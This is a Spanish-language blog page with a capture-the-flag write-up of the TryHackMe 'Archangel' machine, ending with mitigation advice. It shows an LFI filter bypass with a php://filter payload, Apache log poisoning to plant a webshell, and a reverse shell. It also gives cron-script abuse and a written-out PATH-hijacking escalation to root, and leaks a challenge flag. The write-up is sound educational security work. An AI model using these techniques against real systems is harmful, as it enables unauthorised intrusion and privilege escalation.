@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Archangel | ZsZsec</title>
+<meta content="Introducción El propósito de este análisis es documentar paso a paso el proceso de explotación de la máquina objetivo, comenzando desde el reconocimiento inicial hasta la escalada..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Archangel<span>_</span></h1>
+<div class="writeup-meta"><span>LFI / web / Path_Hijacking</span></div>
+<div class="tag-row"><span class="tag">LFI</span><span class="tag">web</span><span class="tag">Path_Hijacking</span><span class="tag">CronJobs</span><span class="tag">Nmap</span><span class="tag">burpsuite</span><span class="tag">php</span><span class="tag">log_poisoning</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1><strong>Introducción</strong></h1>
+<p>El propósito de este análisis es documentar paso a paso el proceso de explotación de la máquina objetivo, comenzando desde el reconocimiento inicial hasta la escalada final de privilegios para obtener acceso como <strong>root</strong>.<br/>
+Durante la evaluación se aplicaron técnicas de enumeración web, explotación mediante <strong>Local File Inclusion (LFI)</strong>, <strong>log poisoning</strong>, obtención de una <strong>reverse shell</strong> y escalada de privilegios mediante la explotación de una <strong>cronjob insegura</strong> y un binario con <strong>PATH Hijacking</strong>.</p>
+<p>El objetivo principal de este writeup es describir de forma clara y técnica las vulnerabilidades identificadas, su explotación efectiva y los mecanismos inseguros presentes en el sistema que permitieron comprometerlo completamente. Este documento también proporciona recomendaciones para mitigar estos fallos y fortalecer la seguridad del entorno.</p>
+<h1>Reconocimiento inicial</h1>
+<p>Comencé realizando un escaneo de puertos utilizando <strong>nmap</strong> para identificar los servicios expuestos en la máquina objetivo:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~/Desktop/LFI]
+└─$ nmap -sS -p- -Pn --min-rate 5000 10.201.6.57 -oN ports.txt               
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 10:30 EST
+Nmap scan report for 10.201.6.57
+Host is up (0.24s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+<p><strong>Resultados:</strong></p>
+<ul>
+<li><strong>Puerto 22/tcp</strong> - SSH abierto</li>
+<li><strong>Puerto 80/tcp</strong> - HTTP abierto</li>
+</ul>
+<p>Posteriormente, ejecuté un escaneo más exhaustivo sobre los puertos detectados:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~/Desktop/LFI]
+└─$ nmap -sV -sC -Pn -p22,80  --min-rate 5000 -oN escaneo.txt 10.201.6.57 
+Nmap scan report for 10.201.6.57
+Host is up (0.23s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Wavefire
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p><strong>Servicios identificados:</strong></p>
+<ul>
+<li><strong>SSH (22/tcp)</strong>: OpenSSH 7.6p1 Ubuntu</li>
+<li><strong>HTTP (80/tcp)</strong>: Apache httpd 2.4.29 (Ubuntu)</li>
+<li><strong>Sistema operativo</strong>: Linux (Ubuntu)</li>
+</ul>
+<h1>Enumeracion Web</h1>
+<p>Al acceder al servidor web en el puerto 80, identifiqué en la interfaz un correo de soporte:
+support@mafialive.thm. Esto sugiere la existencia de un dominio interno de la organización, por lo que procedí a agregarlo al archivo <code>/etc/hosts</code> para facilitar el acceso.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/4dd0dd07-edd0-4521-a305-8d6f6502897b"/></p>
+<p>Luego al recargar el sitio web nos encontraremos con la primera flag</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/eab4858d-c535-4bac-b9d8-dfc49b8761d2"/></p>
+<h2>Enumeración Web y Descubrimiento de LFI</h2>
+<p>Continué con la enumeración de directorios utilizando <strong>Feroxbuster</strong>:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~/Desktop/LFI]
+└─$ feroxbuster -u http://mafialive.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,,js 
+                                                                                                                                                             
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.12.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://mafialive.thm/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.12.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [txt, php, bak, , js]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       15l       21w      286c http://mafialive.thm/test.php
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        3l        3w       59c http://mafialive.thm/
+</code></pre>
+<p><strong>Hallazgos importantes:</strong></p>
+<ul>
+<li><strong>200 GET</strong> - <code>http://mafialive.thm/test.php</code></li>
+</ul>
+<p>Al acceder a <code>test.php</code>, descubrí una funcionalidad que permitía interactuar con la aplicación. Al hacer clic en un botón, observé que la URL cambiaba a:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/8effa40d-99e5-4267-821c-808a8582681a"/></p>
+<h2>Explotación de Vulnerabilidad LFI (Local File Inclusion)</h2>
+<p>Este patrón en la URL indica claramente una <strong>vulnerabilidad de Local File Inclusion (LFI)</strong>, donde el parámetro <code>view</code> está siendo utilizado para incluir archivos del sistema sin una validación adecuada.</p>
+<h2>Bypass de Filtros LFI</h2>
+<p>Al intentar acceder al archivo <code>/etc/passwd</code> directamente mediante <code>http://mafialive.thm/test.php?view=/etc/passwd</code></p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/170724a5-474b-48fb-912c-ce8c27cc93f0"/></p>
+<p>El sistema respondió con un mensaje de error: <strong>"Sorry, Thats not allowed"</strong>, indicando la presencia de un mecanismo de filtrado que bloquea el acceso a rutas sensibles del sistema.</p>
+<h3>Estrategia de Bypass usando Wrappers PHP</h3>
+<p>Para evadir este filtro, utilicé <strong>wrappers PHP</strong>, que son streams que permiten acceder a diferentes recursos usando las funciones de E/S de PHP. El más útil para este escenario es <code>php://filter</code>.</p>
+<p><strong>Payload utilizado:</strong></p>
+<pre><code class="language-php">http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
+</code></pre>
+<p><strong>Explicación del wrapper:</strong></p>
+<ul>
+<li><code>php://filter/</code> - Indica que usaremos el filtro de streams</li>
+<li><code>convert.base64-encode</code> - Codifica el contenido del archivo en base64</li>
+<li>`resource= - Especifica el archivo objetivo</li>
+</ul>
+<h3>Ventajas de este Enfoque</h3>
+<ol>
+<li><strong>Evita detección</strong>: El filtro probablemente no reconoce <code>php://filter</code> como una ruta peligrosa</li>
+<li><strong>Codificación segura</strong>: Base64 evita que el contenido se interprete como código PHP</li>
+<li><strong>Flexibilidad</strong>: Permite leer archivos del sistema</li>
+</ol>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/995986d1-4869-4861-b6dc-a8368ec69914"/></p>
+<h3>Ejecución y Resultados</h3>
+<p>Realicé la petición con el wrapper y obtuve una respuesta diferente: el sistema devolvió el contenido del archivo <code>test.php</code> codificado en base64. Para decodificarlo: realice lo siguiente</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~/Desktop/LFI]
+└─$ echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 --decode 
+</code></pre>
+<h2>Análisis del Código</h2>
+<p>Al decodificar el archivo <code>test.php</code> obtenido mediante el wrapper PHP, descubrimos el código fuente de la aplicación:</p>
+<h3>Hallazgos Clave en el Código</h3>
+<p><strong>Lógica de filtrado identificada:</strong></p>
+<pre><code class="language-php">if(!containsStr($_GET['view'], '../..') &amp;&amp; containsStr($_GET['view'], '/var/www/html/development_testing')) {
+    include $_GET['view'];
+}
+</code></pre>
+<p>El filtro permite solo archivos que:</p>
+<ul>
+<li>NO contengan <code>../..</code> (directory traversal)</li>
+<li>SÍ contengan <code>/var/www/html/development_testing</code></li>
+</ul>
+<h3>Estrategia de Log Poisoning</h3>
+<p>Dado que el filtro restringe el LFI a un directorio específico, procedí con <strong>Log Poisoning</strong> para lograr RCE (Remote Code Execution).</p>
+<p><strong>Ruta del log de Apache identificada:</strong> <code>/var/log/apache2/access.log</code></p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/fceea468-2b90-4255-a739-c32d509725c2"/></p>
+<h3>Log Poisoning</h3>
+<h3>¿Qué es Log Poisoning?</h3>
+<p>El <strong>Log Poisoning</strong> es una técnica que consiste inyectar código malicioso en los archivos de log del servidor para luego ejecutarlo a través de una vulnerabilidad LFI. Apache guarda todas las peticiones HTTP en <code>/var/log/apache2/access.log</code>, incluyendo los headers como User-Agent.</p>
+<h3>Configuración del Ataque con Burp Suite</h3>
+<p><strong>Paso 1: Interceptar la petición inicial</strong></p>
+<ul>
+<li>Abrí Burp Suite y activé el proxy</li>
+<li>Navegué a <code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//..//var/log/apache2/access.log</code></li>
+<li>Intercepté la petición con Burp</li>
+</ul>
+<p><strong>Paso 2: Modificar el User-Agent y Envenenar Log</strong>
+Cambié el header User-Agent para inyectar una webshell PHP:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/a2ef5aa7-633f-4e60-a27d-f672af699c36"/>
+Al enviar esta petición, el servidor registra nuestro User-Agent malicioso en:</p>
+<pre><code class="language-bash">/var/log/apache2/access.log
+</code></pre>
+<h3>Ejecución de Comandos via LFI</h3>
+<p><strong>Paso 4: Acceder al log envenenado</strong><br/>
+Utilicé la vulnerabilidad LFI para incluir el archivo de log, pero con un bypass del filtro:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/ab3ab8e7-8411-41ad-b043-5dd1b4c00e0f"/>
+<strong>Explicación del bypass:</strong></p>
+<ul>
+<li><code>view=/var/www/html/development_testing/</code> - Cumple con el filtro</li>
+<li><code>../../../../</code> - Navega hacia directorios superiores</li>
+<li><code>var/log/apache2/access.log</code> - Accede al archivo de log</li>
+<li><code>&amp;cmd=id</code> - Ejecuta el comando <code>id</code> a través de nuestra webshell</li>
+</ul>
+<h3>Flujo del Ataque</h3>
+<ol>
+<li><strong>Inyección</strong>: User-Agent malicioso → access.log</li>
+<li><strong>Inclusión</strong>: LFI incluye access.log como PHP</li>
+<li><strong>Ejecución</strong>: PHP interpreta nuestro código en el log</li>
+<li><strong>Resultado</strong>: Comando <code>id</code> ejecutado y output mostrado</li>
+</ol>
+<h2>Obtención de Reverse Shell y Escalada de Privilegios</h2>
+<h3>Paso 1: Configurar Listener</h3>
+<p>Primero preparé mi máquina atacante para recibir la conexión reversa:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~/Desktop/LFI]
+└─$ penelope -p 4444
+</code></pre>
+<h3>Paso 2: Ejecutar Reverse Shell via LFI</h3>
+<p>Utilicé la vulnerabilidad LFI con log poisoning para ejecutar la reverse shell en Python:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/6805a00b-96ed-4a6a-b50c-30482333b7d4"/></p>
+<h3>Paso 3: Reconocimiento del Sistema</h3>
+<p>Una vez recibida la reverse shell y estabilizada con penelope, identifiqué la presencia del usuario <strong>warchangel</strong> en el sistema:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/3c9c10af-498e-44e5-9c1b-323a69b5662a"/></p>
+<h1>Escalada de privilegios</h1>
+<p>Al obtener acceso como <code>www-data</code> procedi a checar si habia alguna <code>cronjob</code> corriendo por detras y me encontre con lo siguiente</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/4ee5eeda-440b-427f-abfc-3cfbe79d6a2f"/></p>
+<p>habia una cronjob corriendo el archivo <code>helloworld.sh</code> asi que decidi ir hacia el directorio <code>/opt</code> para checar que permisos tenia yo sobre el archivo.</p>
+<pre><code class="language-bash">www-data@ubuntu:/opt$ ls -la
+total 16
+drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
+drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
+drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
+-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
+</code></pre>
+<p>Encontre que tengo permisos para modificar el archivo, asi que decidi agregarle un codigo que nos proporcionara una <code>reverse shell</code> en <code>bash</code>.</p>
+<p>y mientras tanto me puse en escucha en otro puerto utilizando la herramienta <code>penelope</code></p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/713a0c00-997e-4f52-b8fb-e501d274dc52"/></p>
+<p>ahora que ya soy el usuario <code>archangel</code> tengo permisos para poder interactuar con los otros archivos, entre ellos me encontre un binario llamado <code>backup</code> al hacerle <code>strings</code> al binario <code>backup</code> me encontre con algo que llamo mucho mi atencion.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/3a755b19-4c1c-41cd-958c-f2f0f667561f"/>
+Durante el análisis del binario <code>backup</code>, se ejecutó <code>strings</code> sobre el archivo y se observó que el programa utilizaba el comando <code>cp</code> sin emplear una ruta absoluta, es decir</p>
+<p>El uso de comandos sin ruta absoluta (<code>/bin/cp</code>) es una mala práctica de seguridad, ya que permite que el sistema busque el ejecutable a través de las rutas definidas en la variable de entorno <code>$PATH</code>. Si un atacante puede colocar un ejecutable malicioso con el mismo nombre en un directorio que se evalúe primero que <code>/bin</code>, puede forzar al programa a ejecutar dicho archivo.<br/>
+Cuando el binario es SUID root, esto permite obtener una shell como root.</p>
+<h1>¿Cuál es el problema EXACTO?</h1>
+<p>La línea debería verse así si fuera segura:</p>
+<pre><code class="language-bash">/bin/cp /home/user/archangel/myfiles/* /opt/backupfiles
+</code></pre>
+<p>Pero en su lugar se ve:</p>
+<pre><code class="language-bash">cp /home/user/archangel/myfiles/* /opt/backupfiles
+</code></pre>
+<p><strong>Eso significa que el binario está llamando a “cp” desde la variable $PATH.</strong></p>
+<p>Es decir, NO está diciendo:</p>
+<blockquote>
+<p>“Ejecuta /bin/cp”</p>
+</blockquote>
+<p>Sino:</p>
+<blockquote>
+<p>“Busca un archivo llamado cp en los directorios del PATH y ejecuta el primero que encuentres”.</p>
+</blockquote>
+<h1>¿Por qué es inseguro?</h1>
+<p>Porque si TÚ (el atacante) puedes:</p>
+<ul>
+<li>Crear un archivo ejecutable llamado <code>cp</code></li>
+<li>Colocarlo en un directorio que se evalúe ANTES que <code>/bin</code></li>
+<li>Modificar el <code>$PATH</code> (o si el programa ya usa un PATH inseguro)</li>
+</ul>
+<p>Entonces el programa ejecutará <strong>tu archivo</strong> en vez del verdadero <code>/bin/cp</code>.</p>
+<p>Y si el binario es SUID root o corre como root →<br/>
+<strong>tu archivo se ejecuta como root</strong>.</p>
+<h2><strong>Preparación del binario malicioso</strong></h2>
+<p>El primer paso consistió en crear un ejecutable llamado <code>cp</code> dentro de un directorio bajo control del usuario. Este archivo simplemente ejecuta una shell:</p>
+<pre><code class="language-bash">echo '/bin/bash' &gt; cp
+chmod +x cp
+</code></pre>
+<h2><strong>Manipulación de la variable PATH</strong></h2>
+<p>Para asegurarnos de que nuestro binario malicioso <code>cp</code> fuese encontrado antes que el verdadero <code>/bin/cp</code>, se modificó la variable <code>$PATH</code>, añadiendo el directorio actual al inicio:</p>
+<pre><code class="language-bash">export PATH=$(pwd):$PATH
+</code></pre>
+<p>De esta forma, cuando el binario <code>backup</code> invoque el comando <code>cp</code>, el sistema ejecutará nuestro archivo malicioso.</p>
+<h2><strong>Ejecución del binario vulnerable</strong></h2>
+<p>Finalmente, se ejecutó el binario <code>backup</code>, el cual posee el bit SUID establecido:</p>
+<pre><code class="language-bash">./backup
+</code></pre>
+<p>Al ejecutarse, el programa intentó utilizar el comando <code>cp</code> como parte de su funcionalidad interna. Debido a la manipulación del PATH, terminó ejecutando nuestro binario malicioso en su lugar. Esto resultó en la obtención de una shell con privilegios de root:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/2cd5bb6e-b138-4c73-9ce0-f9f5cdfe62bf"/></p>
+<h1>Cuadro de Explotacion</h1>
+<table>
+<thead>
+<tr>
+<th>Etapa</th>
+<th>Descripción</th>
+<th>Herramientas</th>
+<th>Resultado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. Reconocimiento</strong></td>
+<td>Escaneo de puertos y servicios expuestos.</td>
+<td><code>nmap</code></td>
+<td>Servicios SSH (22) y HTTP (80) descubiertos.</td>
+</tr>
+<tr>
+<td><strong>2. Enumeración Web</strong></td>
+<td>Descubrimiento de dominio y archivos expuestos.</td>
+<td>Navegador, <code>feroxbuster</code></td>
+<td>Hallazgo de <code>test.php</code> y funcionalidad vulnerable.</td>
+</tr>
+<tr>
+<td><strong>3. LFI (Local File Inclusion)</strong></td>
+<td>Identificación del parámetro vulnerable <code>view</code>.</td>
+<td>Manual, <code>php://filter</code></td>
+<td>Lectura de archivos y bypass de filtros usando wrappers.</td>
+</tr>
+<tr>
+<td><strong>4. Análisis del Código</strong></td>
+<td>Obtención del código fuente con base64.</td>
+<td><code>base64</code>, <code>php://filter</code></td>
+<td>Descubrimiento del filtro y ruta permitida.</td>
+</tr>
+<tr>
+<td><strong>5. Log Poisoning</strong></td>
+<td>Inyección de webshell en el <code>access.log</code> a través de User-Agent.</td>
+<td>Burp Suite</td>
+<td>Ejecución de comandos mediante LFI → RCE.</td>
+</tr>
+<tr>
+<td><strong>6. Reverse Shell</strong></td>
+<td>Ejecución de payload para obtener shell interactiva.</td>
+<td>Python, <code>penelope</code></td>
+<td>Acceso como <code>www-data</code>.</td>
+</tr>
+<tr>
+<td><strong>7. Escalada a archangel</strong></td>
+<td>Abuso de cronjob modificable (<code>helloworld.sh</code>).</td>
+<td>Bash</td>
+<td>Reverse shell como usuario archangel.</td>
+</tr>
+<tr>
+<td><strong>8. Análisis SUID</strong></td>
+<td>Descubrimiento de binario <code>backup</code> vulnerable.</td>
+<td><code>strings</code>, análisis manual</td>
+<td>Identificación de PATH Hijacking.</td>
+</tr>
+<tr>
+<td><strong>9. Escalada a root</strong></td>
+<td>Creación de <code>cp</code> malicioso y manipulación del PATH.</td>
+<td>Bash</td>
+<td>Ejecución del binario como root → Shell root.</td>
+</tr>
+</tbody>
+</table>
+<h1><strong>Conclusión</strong></h1>
+<p>Durante la explotación de la máquina se observaron múltiples vulnerabilidades críticas que permitieron comprometer completamente el sistema.<br/>
+El proceso comenzó con una vulnerabilidad <strong>LFI</strong> que, combinada con un <strong>log poisoning</strong>, permitió lograr <strong>Remote Code Execution</strong> y posicionarse en el sistema como el usuario <code>www-data</code>.</p>
+<p>Posteriormente, se identificó una <strong>cronjob insegura</strong> que ejecutaba un script modificable por un usuario no privilegiado, permitiendo escalar a <code>archangel</code>. Finalmente, se encontró un binario SUID que utilizaba comandos sin rutas absolutas, lo cual permitió realizar un <strong>PATH Hijacking</strong> obteniendo acceso total como <strong>root</strong>.</p>
+<p>Este caso evidencia cómo la combinación de varias malas prácticas de desarrollo y administración puede derivar en la pérdida total de control del sistema.</p>
+<hr/>
+<h1><strong>Recomendaciones</strong></h1>
+<h2><strong>1. Validación estricta de parámetros (LFI)</strong></h2>
+<ul>
+<li>Evitar incluir archivos basados en parámetros GET.</li>
+<li>Implementar whitelists reales y no validaciones parciales.</li>
+<li>Deshabilitar la inclusión dinámica (<code>allow_url_include</code>, etc.).</li>
+</ul>
+<h2><strong>2. Configuración segura de logs</strong></h2>
+<ul>
+<li>No permitir que headers sin sanitizar se escriban directamente en archivos ejecutados por PHP.</li>
+<li>Mover logs fuera del alcance del webserver.</li>
+</ul>
+<h2><strong>3. Manejo correcto de permisos</strong></h2>
+<ul>
+<li>Los scripts ejecutados por cron <strong>nunca</strong> deben ser editables por usuarios no privilegiados.</li>
+<li>Asignar permisos 600 o 700 según corresponda.</li>
+<li>Revisar permisos peligrosos como <code>777</code>.</li>
+</ul>
+<h2><strong>4. Evitar uso de rutas relativas en binarios</strong></h2>
+<ul>
+<li>Todos los comandos deben ejecutarse con <strong>ruta absoluta</strong>.</li>
+<li>Auditar binarios SUID para prácticas inseguras.</li>
+</ul>
+<h2><strong>5. Deshabilitar SUID innecesarios</strong></h2>
+<ul>
+<li>Revisar binarios con <code>find / -perm -4000</code> y deshabilitar los no esenciales.</li>
+</ul>
+<h2><strong>6. Mantener el sistema actualizado</strong></h2>
+<ul>
+<li>Apache, PHP y OpenSSH deben mantenerse en versiones seguras y soportadas.</li>
+</ul>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
